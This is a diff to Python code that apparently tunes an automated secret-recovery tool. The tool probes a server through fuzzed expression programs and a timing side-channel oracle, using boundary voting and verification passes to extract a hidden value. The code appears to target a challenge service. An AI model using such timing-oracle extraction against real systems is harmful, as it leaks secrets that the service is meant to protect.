@@ -808,11 +808,12 @@ def recover_from_strict_expr_fuzz_suite(
     userid: str,
     timeout_s: float,
     debug: bool,
-    max_probes: int = 96,
+    max_probes: int = 64,
 ) -> int:
     programs = iter_strict_expr_fuzz_programs()
     tested = 0
     informative = 0
+    no_signal_streak = 0
     for name, source in programs:
         if tested >= max_probes:
             break
@@ -844,6 +845,7 @@ def recover_from_strict_expr_fuzz_suite(
             and res_lo.kind != res_hi.kind
         ):
             informative += 1
+            no_signal_streak = 0
             debug_log(
                 debug,
                 f"[strict-fuzz] informative kind probe {name}: "
@@ -870,6 +872,7 @@ def recover_from_strict_expr_fuzz_suite(
             and res_lo.value != res_hi.value
         ):
             informative += 1
+            no_signal_streak = 0
             debug_log(
                 debug,
                 f"[strict-fuzz] informative bool probe {name}: "
@@ -884,6 +887,11 @@ def recover_from_strict_expr_fuzz_suite(
                 )
             except StrategyFailed:
                 pass
+
+        # Fast-fail in strict mode when many probes yield no endpoint signal.
+        no_signal_streak += 1
+        if tested >= 24 and no_signal_streak >= 24:
+            break
 
     raise StrategyFailed(
         f"strict expr-fuzz found no usable oracle (tested={tested}, informative={informative})"
@@ -1090,8 +1098,8 @@ def recover_from_timing_oracle(
     burn_candidates = [6_000_000, 12_000_000, 24_000_000, 48_000_000, 96_000_000]
     sc_term_candidates = [200, 400, 800, 1600, 3200, 6400]
     alloc_timing_candidates = [(2000, 1021), (4000, 1021), (8000, 509)]
-    min_ratio = 1.015
-    min_gap_s = 0.0010
+    min_ratio = 1.03
+    min_gap_s = 0.0020
     min_boundary_consistency = 0.80
 
     candidates: list[tuple[str, str]] = []
@@ -1165,18 +1173,17 @@ def recover_from_timing_oracle(
 
             # Dynamic cost control: some candidates (especially allocation-based ones)
             # can become very expensive during boundary voting / binary search.
-            classify_repeats = repeats
-            votes_total = 3
-            boundary_checks = 9
-            probe_scale = max(t_false, t_true)
-            if probe_scale > 0.10:
+            classify_repeats = max(2, min(3, repeats))
+            votes_total = 2
+            boundary_checks = 5
+            if ratio >= 1.12 and gap >= 0.010:
+                classify_repeats = 1
+                votes_total = 1
+                boundary_checks = 3
+            elif ratio >= 1.08 and gap >= 0.005:
                 classify_repeats = max(1, repeats // 2)
                 votes_total = 1
                 boundary_checks = 3
-            elif probe_scale > 0.07:
-                classify_repeats = max(2, repeats // 2)
-                votes_total = 2
-                boundary_checks = 5
             debug_log(
                 debug,
                 f"[timing] {candidate_name}: classify-repeats={classify_repeats} "
@@ -1213,10 +1220,15 @@ def recover_from_timing_oracle(
             boundary_lo, conf_lo = boundary_vote(SECRET_MIN, boundary_checks)
             boundary_hi, conf_hi = boundary_vote(SECRET_MAX_EXCLUSIVE, boundary_checks)
 
-            if candidate_name.startswith("alloc-timing-") and (
+            if (
+                candidate_name.startswith("alloc-timing-")
+                and ratio >= 1.12
+                and gap >= 0.010
+                and (
                 conf_lo < min_boundary_consistency
                 or conf_hi < min_boundary_consistency
                 or boundary_lo == boundary_hi
+                )
             ):
                 # Fallback for noisy alloc-timing probes: scan for a stable local
                 # sign change in mapped input space, then classify against that.
@@ -1228,7 +1240,7 @@ def recover_from_timing_oracle(
                 point_truth: dict[int, bool] = {}
                 point_conf: dict[int, float] = {}
                 for x in grid:
-                    val, conf = boundary_vote(x, 5)
+                    val, conf = boundary_vote(x, 3)
                     point_truth[x] = val
                     point_conf[x] = conf
 
@@ -1284,7 +1296,7 @@ def recover_from_timing_oracle(
 
                     verify_passes = 0
                     verified_value: Optional[int] = None
-                    for _ in range(7):
+                    for _ in range(5):
                         verified = verify_nearby_candidates(
                             server_command=server_command,
                             userid=userid,
@@ -1294,7 +1306,7 @@ def recover_from_timing_oracle(
                         if verified is not None:
                             verify_passes += 1
                             verified_value = verified
-                    if verify_passes >= 5 and verified_value is not None:
+                    if verify_passes >= 3 and verified_value is not None:
                         if verified_value != candidate:
                             debug_log(
                                 debug,
@@ -1304,7 +1316,7 @@ def recover_from_timing_oracle(
                     debug_log(
                         debug,
                         f"[timing] {candidate_name}: local-bracket candidate failed verification "
-                        f"({verify_passes}/7)",
+                        f"({verify_passes}/5)",
                     )
 
             if conf_lo < min_boundary_consistency or conf_hi < min_boundary_consistency:
@@ -1332,7 +1344,7 @@ def recover_from_timing_oracle(
             # continue trying other timing templates if this one is a false positive.
             verify_passes = 0
             verified_value: Optional[int] = None
-            for _ in range(7):
+            for _ in range(5):
                 verified = verify_nearby_candidates(
                     server_command=server_command,
                     userid=userid,
@@ -1342,7 +1354,7 @@ def recover_from_timing_oracle(
                 if verified is not None:
                     verify_passes += 1
                     verified_value = verified
-            if verify_passes >= 5 and verified_value is not None:
+            if verify_passes >= 3 and verified_value is not None:
                 if verified_value != candidate:
                     debug_log(
                         debug,
@@ -1352,7 +1364,7 @@ def recover_from_timing_oracle(
 
             last_failure = (
                 f"timing candidate from {candidate_name} failed verification "
-                f"({verify_passes}/7)"
+                f"({verify_passes}/5)"
             )
             debug_log(debug, f"[timing] {last_failure}")
             continue
